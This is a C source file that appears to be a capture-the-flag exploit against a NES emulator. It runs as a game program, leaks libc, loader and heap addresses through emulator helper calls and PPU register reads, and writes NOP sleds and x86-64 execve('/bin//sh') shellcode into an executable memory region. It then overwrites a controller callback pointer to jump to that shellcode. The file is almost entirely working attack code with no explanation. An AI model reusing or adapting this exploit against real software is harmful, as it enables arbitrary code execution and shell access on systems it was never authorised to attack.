#include <stdint.h>

extern void bka(uint8_t a);
extern void bkx(uint8_t a);

#define DREAM_OFF 0xA2D60
#define HEAP_LIBC_PAGE 0x4
#define HEAP_LIBC_OFF 0x1E50
#define LD_PAGE 0x1
#define LD_OFF 0x1210
#define HEAP_OFF 0x1180
#define RWX_OFF 0x3000
#define LIBC_OFF 0x217000
#define SYSTEM_OFF 0x28670
#define FUNC_OVERWRITE_OFF 0x3FB038
#define M_RAM_OFF 0x4213E0
#define JOYCON_CB_RWX_DIFF 0x62D79

enum IORegisters
{
    PPUCTRL = 0x2000,
    PPUMASK,
    PPUSTATUS,
    OAMADDR,
    OAMDATA,
    PPUSCROL,
    PPUADDR,
    PPUDATA,
    OAMDMA = 0x4014,
    PUTC = 0x4015,
    JOY1 = 0x4016,
    JOY2 = 0x4017,
};

//aligned to 0x10, necessary
uint8_t shellcode[] = { 0x90,
    0x48,0x31,0xd2,0x48,0x31,0xc0,0x48,0x31,
    0xf6,0x48,0xbb,0x2f,0x2f,0x62,0x69,0x6e,
    0x2f,0x73,0x68,0x48,0xc1,0xeb,0x08,0x53,
    0x48,0x89,0xe7,0xb0,0x3b,0x0f,0x05,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

uint8_t pattern[] = {0x64,0x4c,0x8b,0x1c,0x25,0x28,0xff,0xff,0xff,0x41,0xff,0xa3,0x18,0x3c,0x00,0x00}; //the bytes found in libc

void reset() {
  bka(0); bka(0); bka(0); bka(0);
  bka(0); bka(0); bka(0); bka(0);
}

void sub64(uint32_t al, uint32_t ah, uint32_t bl, uint32_t bh,
           uint32_t *xl, uint32_t *xh) {
  *xl = al - bl;
  if (al < bl) {
    *xh = ah - bh - 1;
  } else {
    *xh = ah - bh;
  }
}

void xorAt64(uint32_t ofs_low, uint32_t ofs_high, uint8_t value) {
  int i;
  for (i = 0; i < 4; i++) bka((ofs_high >> ((3-i)*8)) & 0xff);
  for (i = 0; i < 4; i++) bka((ofs_low >> ((3-i)*8)) & 0xff);
  bkx(value);
  reset();
}

void xorAt(uint32_t offset, uint8_t value) {
  int i;
  for (i = 0; i < 4; i++) bka((offset >> ((3-i)*8)) & 0xff);
  bkx(value);
  reset();
}

void putchar(uint8_t c) {
  *(uint8_t*)(0x4015) = c;
}

uint8_t get_data(uint16_t addr){
    uint8_t a = (addr >> 8) & 0xff, b = addr &0xff;
    *(uint8_t*)(PPUADDR) = a;
    *(uint8_t*)(PPUADDR) = b;
    return *(uint8_t*)PPUDATA;
}


void set_ppu_data(uint8_t chef){
    *(uint8_t*)PPUDATA = chef;
}

uint8_t libc_addr[8];

void leak(uint16_t offset, uint32_t* high, uint32_t* low){
    uint8_t i = 0;
    get_data(0);
    for(i = 0; i < 4; i++)
        *low |= (uint32_t)get_data(offset+i+1)<<(i*8);
    for(i = 0; i < 4; i++)
        *high |= (uint32_t)get_data(offset+i+5)<<(i*8);
    get_data(0);
}

void log64(uint32_t high, uint32_t low){
    uint8_t i = 0;
    putchar(0x46);
    putchar(0x46);
    for(i = 0; i < 4; i++)
        putchar((low >> (i*8)) & 0xFF);
    for(i = 0; i < 4; i++)
        putchar((high >> (i*8)) & 0xFF);
    putchar(0x41);
    putchar(0x42);
    putchar(0x43);
}

int main(void) {
    uint32_t rwx_low, rwx_high;
    uint32_t mram_low, mram_high;
    uint32_t libc_low, libc_high;
    uint32_t mram_rwx_off_low, mram_rwx_off_high;
    uint32_t joycon_cb_fn_low, overwrite;
    uint8_t i,j;

    //set different CHR page
    xorAt64(DREAM_OFF+0x1c, 0, HEAP_LIBC_PAGE);

    libc_low = libc_high = 0;

    leak(HEAP_LIBC_OFF, &libc_high, &libc_low);


    log64(libc_high, libc_low);

    //libc_low -= LIBC_OFF //compute base address
    xorAt64(DREAM_OFF+0x1c, 0, HEAP_LIBC_PAGE); //reset the one page
    xorAt64(DREAM_OFF+0x1c, 0, LD_PAGE & 0xff); //reset the one page
    xorAt64(DREAM_OFF+0x1d, 0, (LD_PAGE>>8) & 0xff); //reset the one page

    rwx_low = rwx_high = 0;
    leak(LD_OFF, &rwx_high, &rwx_low);

    rwx_low -= RWX_OFF;
    rwx_low &= 0xFFFFFF00;

    mram_low = mram_high = 0;
    leak(HEAP_OFF, &mram_high, &mram_low);
    mram_low -= M_RAM_OFF; //set the heap leak to m_RAM

    log64(rwx_high, rwx_low);
    log64(mram_high, mram_low);

    sub64(rwx_low, rwx_high, mram_low, mram_high, &mram_rwx_off_low, &mram_rwx_off_high);
    log64(mram_rwx_off_high, mram_rwx_off_low);

    //prep shellcode with the pattern found at rwx section
    for(i = 0; i < 0x10; i++)
        shellcode[i] ^= pattern[i];
    for(i = 0; i < 0x10; i++)
        shellcode[i+0x10] ^= pattern[i];
    shellcode[0x20] ^= pattern[0]; 
    shellcode[0x21] ^= pattern[1]; 

    
    //create nop
    for(i = 0; i < 0x10; i++)
        pattern[i] ^= 0x90;

    for(j = 0; j < 0x3;j++){
        for(i = 0; i < 0xd0; i++)
            xorAt64(mram_rwx_off_low+i, mram_rwx_off_high, pattern[i%0x10]);
        mram_rwx_off_low+= 0xd0;
            //write shellcode
        for(i = 0; i < 34; i++)
            xorAt64(mram_rwx_off_low+i, mram_rwx_off_high, shellcode[i]);
        mram_rwx_off_low += 0x30;
    }
    mram_rwx_off_low -= 0x300;
    reset();
    reset();

    //overwrite callback function
    overwrite = rwx_low;
    joycon_cb_fn_low = rwx_low - JOYCON_CB_RWX_DIFF;
    overwrite ^= joycon_cb_fn_low;
    overwrite |= 0x800;
    for(i = 0; i < 4; i++)
        xorAt64(FUNC_OVERWRITE_OFF+i, 0, (overwrite >> (i*8)) & 0xFF);
    

    putchar(0x47);
    putchar(0x47);
    putchar(0x47);
    putchar(0x47);
    putchar(0x47);
    //trigger
    while(1){
        *(uint8_t*)JOY1 = i;
    }
    return 0;
}
